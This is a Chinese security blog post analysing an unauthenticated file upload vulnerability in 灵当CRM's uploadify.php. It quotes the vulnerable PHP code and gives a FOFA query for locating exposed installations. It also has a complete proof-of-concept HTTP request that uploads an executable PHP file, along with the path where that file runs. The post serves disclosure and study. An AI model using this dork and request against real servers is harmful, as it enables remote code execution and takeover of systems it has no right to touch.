---
title: "灵当CRM /crm/uploaddify/uploadify.php 文件上传漏洞"
source: https://mrxn.net/jswz/51mis-uploaddify-uploadify-rce.html
asset_dir: assets/灵当crm-crmuploaddifyuploadify.php-文件上传漏洞
---

# 灵当CRM /crm/uploaddify/uploadify.php 文件上传漏洞

[Mrxn](https://mrxn.net/author/1)- 发表于2025/2/20 08:12
- 1308浏览
- [0评论](#comment)
- 41分钟阅读

深入探索

技术文章订阅

安全运维咨询

安全研究工具

---

# 漏洞简介

灵当CRM是一款专为中小企业打造的智能客户关系管理工具，由上海灵当信息科技有限公司开发并运营。广泛应用于金融、教育、医疗、IT服务、房地产等多个行业领域，帮助企业实现客户个性化管理需求，提升企业竞争力。无论是新客户开拓、老客户维护，还是销售过程管理、服务管理等方面，灵当CRM都能提供全面、高效的解决方案。灵当CRM /crm/uploaddify/uploadify.php 接口存在任意[文件上传](https://mrxn.net/tag/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0)漏洞，未经身份验证的攻击者可通过该漏洞在服务器端写入后门，任执行意代码，获取服务器权限，进而控制整个 web 服务器。

漏洞扫描服务

# 影响版本

# fofa语法

> `body="crmcommon/js/jquery/jquery-1.10.1.min.js" || (body="http://localhost:8088/crm/index.php" && body="ldcrm.base.js")`

# 漏洞分析

直接看 /crm/uploaddify/uploadify.php 业务逻辑实现

```
<?php
    //文件夹名称

    error_reporting(E_ALL^E_NOTICE^E_WARNING);
    global $current_user;
    $myatt_id=$_POST['myatt_id'];
    $setype=$_POST['myatt_moduel'];
    if(!empty($myatt_id))
    {
        $filepath = 'storage/'.$setype.'/'.$myatt_id.'/';

        $targetFolder ="../$filepath";
        if(!file_exists('../storage/'.$setype))
        {
            mkdir('../storage/'.$setype,0777);
        }

       if(!file_exists($targetFolder))
       {
        mkdir($targetFolder,0777);
       }
    }
    else
    {
        $fyear=date("Y");
        $fmonth=date('F');
        $fday=date('j');//获取当前月份第几天
        $fweek='week'.ceil($fday/7);//获取当前日期所属月份的第几周
        if(!file_exists('../storage/'.$fyear))
        {
             mkdir('../storage/'.$fyear,0777);
        }
        if(!file_exists('../storage/'.$fyear.'/'.$fmonth))
        {
             mkdir('../storage/'.$fyear.'/'.$fmonth,0777);
        }
         if(!file_exists('../storage/'.$fyear.'/'.$fmonth.'/'.$fweek))
        {
             mkdir('../storage/'.$fyear.'/'.$fmonth.'/'.$fweek,0777);
        }
        $targetFolder='../storage/'.$fyear.'/'.$fmonth.'/'.$fweek.'/';
    }
    $verifyToken = $_POST['timestamp'];
    //if (!empty($_FILES) && $_POST['token'] == $verifyToken) {
    $tempFile = $_FILES['Filedata']['tmp_name'];
    $file_path = "../modules/Attachment/attachments.txt";
   $filehandle = fopen($file_path,"r");
   $filestring= fgets($filehandle);
   $fileTypes=explode(',',$filestring);

    fclose($filehandle);
    /**
       * date:20140612
       * reason:有空格将空格替换成“_”
       */
    $file_name=str_replace(" ","_",$_FILES['Filedata']['name']);  
    $fileParts = pathinfo($file_name);
   /**
   * edit:can
   * date:20140211
   * reason:新需求：上传文件名称在服务器不变；
   * edit:diony
   * date:20140612
   * reason:有空格将空格替换成“_”
   */ 
  $arr=array("ASCII","UTF-8","GB2312","GBK",'BIG-5');
  $encode=mb_detect_encoding($file_name, $arr); 
  if($encode=='UTF-8')
  {
    $targetFile=iconv('UTF-8','gbk',$file_name);
  }
  else
  {
     $targetFile=$file_name;
  }
  if(strtolower(PHP_OS)=='freebsd'||strtolower(PHP_OS)=='linux'||strtolower(PHP_OS)=='unix')
  {
    //获取系统类型，如果是非windows系统则不用修改编码格式
    $targetFile=$file_name;
  }

    if (in_array(strtolower($fileParts['extension']),$fileTypes)) {

            if(move_uploaded_file($tempFile,$targetFolder.$targetFile)){
                $path=$targetFolder; 
            //$arr=array('a'=>$targetFile,'b'=>$path); 
            //$data=json_encode($arr);
            echo $path."?"."$targetFile";
            }else{
                    echo '上传失败';
            }
    } else {
            echo '扩展名无效';
    }

?>
```

根据 myatt\_id 是否为空来生成文件储存目录

网络安全

如果 myatt\_moduel 不为空，则文件保存在 /crm/storage/myatt\_moduel值/myatt\_id值（如果有）/原始文件名

否则文件保存在 /crm/storage/2023/01/week1（第几周）/原始文件名

上传文件后缀根据 modules/Attachment/attachments.txt 来判断是否允许，允许的扩展如下

[![灵当CRM /crm/uploaddify/uploadify.php 文件上传漏洞](images/img-001-d767a31680be.webp)](https://image.mrxn.net/ece14ed37d6f48dcb24a64d240c48a5e.webp)

如果存在php、phtml类可执行文件后缀，则造成文件上传致RCE[漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)。

文件类型验证与文件保存

1. 判断上传文件的扩展名是否在允许的扩展名数组中（以小写比较）。
2. 如果验证通过，则调用 move\_uploaded\_file 将文件从临时路径移动到目标文件夹中，并使用处理后的文件名保存。
3. 成功后，返回拼接后的字符串：目标文件夹路径 + "?" + 文件名。
4. 如果移动失败，则输出“上传失败”。
5. 如果文件扩展名不符合要求，则输出“扩展名无效”。

# 漏洞复现

```
POST /crm/uploaddify/uploadify.php HTTP/1.1
Host: 51mis.mrxn.net
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryABC123

------WebKitFormBoundaryABC123
Content-Disposition: form-data; name="myatt_moduel";

1017
------WebKitFormBoundaryABC123
Content-Disposition: form-data; name="myatt_id";

2024
------WebKitFormBoundaryABC123
Content-Disposition: form-data; name="Filedata"; filename="test.php"
Content-Type: application/x-php

<?=md5(123456);unlink(__FILE__);
------WebKitFormBoundaryABC123--
```

[![灵当CRM /crm/uploaddify/uploadify.php 文件上传漏洞](images/img-002-85baa37e4a4a.webp)](https://image.mrxn.net/2dc8da49ef6a4a8bb41348f8314cd699.webp)

访问文件 /crm/storage/1017/2024/test.php

漏洞扫描服务

[![灵当CRM /crm/uploaddify/uploadify.php 文件上传漏洞](images/img-003-d605defe7eb2.webp)](https://image.mrxn.net/5b043ca1cdd44a9b9b2b8bcdaed0f27f.webp)

- 标签：
- [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
- [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
- [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
- [#rce](https://mrxn.net/tag/rce)
- [#文件上传](https://mrxn.net/tag/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0)

---

文章目录

- [1.漏洞简介](#toc-1-)
- [2.影响版本](#toc-2-)
- [3.fofa语法](#toc-3-)
- [4.漏洞分析](#toc-4-)
- [5.漏洞复现](#toc-5-)

  
  

![](data:image/png;base64,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)

手机扫码阅读
